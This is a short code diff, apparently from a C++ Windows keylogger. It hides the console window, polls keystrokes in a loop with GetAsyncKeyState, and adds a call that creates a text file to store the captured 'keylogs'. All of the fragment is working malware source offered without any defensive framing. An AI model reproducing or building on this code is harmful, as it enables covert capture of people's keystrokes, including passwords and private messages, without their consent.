@@ -12,6 +12,9 @@ void MainLoop::run(){
     HWND hwnd = GetConsoleWindow();
     ShowWindow(hwnd, SW_HIDE);
 
+    // Create a txt file to save the keylogs
+    createtxtfile();
+
     while (true) {
         for (int key = 8; key <= 190; key++){
             if(GetAsyncKeyState(key) == -32767){
